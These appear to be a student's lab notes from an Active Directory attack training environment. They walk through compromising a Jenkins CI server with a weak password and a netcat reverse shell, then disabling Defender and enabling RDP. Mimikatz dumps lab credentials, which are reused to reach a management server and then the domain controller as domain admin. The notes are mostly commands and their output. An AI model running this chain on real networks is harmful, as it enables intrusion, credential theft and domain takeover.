- CI points us towards DevOps. Check for specific automation tools such as Jenkins, Alfred, etc.
![[poc_00000.png]]
![[poc_00001.png]]

- Try username as password.
![[poc_00002.png]]

- Host the needed files in HFS and turn-off the Defender Firewall.
![[poc_00004.png]]

![[poc_00005.png]]

- Get a reverse shell.
![[poc_00003.png]]

- Add `dcorp\student303` as a local administrator to `DCORP-CI` in order to obtain a stable remote `PowerShell` connection.
```
PS C:\Ad\MyTools> .\nc64.exe -lvnp 443
listening on [any] 443 ...
connect to [172.16.100.3] from (UNKNOWN) [172.16.3.11] 50342
Windows PowerShell running as user ciadmin on DCORP-CI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\.jenkins\workspace\Project14>hostname
dcorp-ci
PS C:\Users\Administrator\.jenkins\workspace\Project14> whoami
dcorp\ciadmin
PS C:\> net localgroup Administrators dcorp\student303 /add
The command completed successfully.
```

- Dump secrets from `DCORP-CI`.
```
[dcorp-ci]: PS C:\Users\student303\Documents> cd C:\Windows\Tasks
[dcorp-ci]: PS C:\Windows\Tasks> Set-MpPreference -DisableRealtimeMonitoring $true
[dcorp-ci]: PS C:\Windows\Tasks> net use N: \\172.16.100.3\MyTools /user:dcorp\student303 a5fdNPDwScrD7T2A
The command completed successfully.

[dcorp-ci]: PS C:\Windows\Tasks> cp //172.16.100.3/MyTools/mimikatz.exe .
[dcorp-ci]: PS C:\Windows\Tasks> cp //172.16.100.3/MyTools/mimikatz.exe .
[dcorp-ci]: PS C:\Windows\Tasks> Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' fDenyTSConnections 0
[dcorp-ci]: PS C:\Windows\Tasks> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

[dcorp-ci]: PS C:\Windows\Tasks> Enable-NetFirewallRule -DisplayName 'Remote Desktop - User Mode (TCP-In)'
[dcorp-ci]: PS C:\Windows\Tasks> Enable-NetFirewallRule -DisplayName 'Remote Desktop - User Mode (UDP-In)'
```

- RDP to `DCORP-CI` (`mimikatz.exe` does not behave well on PowerShell sessions without RDP).
![[poc_00006.png]]

![[poc_00007.png]]

```
PS C:\Windows\Tasks> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

<snip>

Authentication Id : 0 ; 55141 (00000000:0000d765)
Session           : Service from 0
User Name         : ciadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/4/2023 2:15:25 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1121
        msv :
         [00000003] Primary
         * Username : ciadmin
         * Domain   : dcorp
         * NTLM     : e08253add90dccf1a208523d02998c3d
         * SHA1     : f668208e94aec0980d3fd18044e3e64908fe9b03
         * DPAPI    : 6d0c10cc59972f288e11b5621508b6fe
        tspkg :
        wdigest :
         * Username : ciadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : ciadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ContinuousIntrusion123
        ssp :
        credman :

<snip>
```

- Test `docrp\ciadmin` credentials for local admin access to computers.
```
PS C:\AD\MyTools> $ciadminpasswd = ConvertTo-SecureString -AsPlainText -Force -String "*ContinuousIntrusion123"
PS C:\AD\MyTools> $ciadmincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "dcorp\ciadmin",$ciadminpasswd
PS C:\AD\MyTools> foreach($line in Get-Content .\hosts.txt) {Test-AdminAccess -ComputerName $line -Credential $ciadmincred -WarningAction SilentlyContinue}

ComputerName   IsAdmin
------------   -------
DCORP-DC         False
DCORP-ADMINSRV   False
DCORP-APPSRV     False
DCORP-CI          True
DCORP-MGMT        True
DCORP-MSSQL      False
DCORP-SQL1       False
```

- RDP to `DCORP-MGMT` (after configuring RDP via a Remote PowerShell session) to dump credentials.
```
PS C:\AD\MyTools> Enter-PSSession -ComputerName dcorp-mgmt -Credential $ciadmincred
[dcorp-mgmt]: PS C:\Users\ciadmin\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
[dcorp-mgmt]: PS C:\Users\ciadmin\Documents> cd C:\Windows\Tasks
[dcorp-mgmt]: PS C:\Windows\Tasks> net use N: \\172.16.100.3\MyTools /user:dcorp\student303 a5fdNPDwScrD7T2A
The command completed successfully.

[dcorp-mgmt]: PS C:\Windows\Tasks> cp //172.16.100.3/MyTools/mimikatz.exe .
[dcorp-mgmt]: PS C:\Windows\Tasks> Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' fDenyTSConnections 0
[dcorp-mgmt]: PS C:\Windows\Tasks> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

[dcorp-mgmt]: PS C:\Windows\Tasks> Enable-NetFirewallRule -DisplayName 'Remote Desktop - User Mode (TCP-In)'
[dcorp-mgmt]: PS C:\Windows\Tasks> Enable-NetFirewallRule -DisplayName 'Remote Desktop - User Mode (UDP-In)'
```

![[poc_00008.png]]
![[poc_00009.png]]

```
PS C:\Users\ciadmin> cd C:\Windows\Tasks
PS C:\Windows\Tasks> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

<snip>

Authentication Id : 0 ; 58872 (00000000:0000e5f8)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/4/2023 2:15:24 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118
        msv :
         [00000003] Primary
         * Username : svcadmin
         * Domain   : dcorp
         * NTLM     : b38ff50264b74508085d82c69794a4d8
         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
         * DPAPI    : f26ae0cc48396dccd8caa24cd33127e7
        tspkg :
        wdigest :
         * Username : svcadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
        ssp :
        credman :

<snip>
```

- `dcorp\svcadmin` is a DA.
```
PS C:\AD\MyTools> $svcadminpasswd = ConvertTo-SecureString -AsPlainText -Force -String "*ThisisBlasphemyThisisMadness!!"
PS C:\AD\MyTools> $svcadmincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "dcorp\svcadmin",$svcadminpasswd
PS C:\AD\MyTools> Enter-PSSession -ComputerName DCORP-DC -Credential $svcadmincred
[DCORP-DC]: PS C:\Users\svcadmin\Documents> hostname
dcorp-dc
[DCORP-DC]: PS C:\Users\svcadmin\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```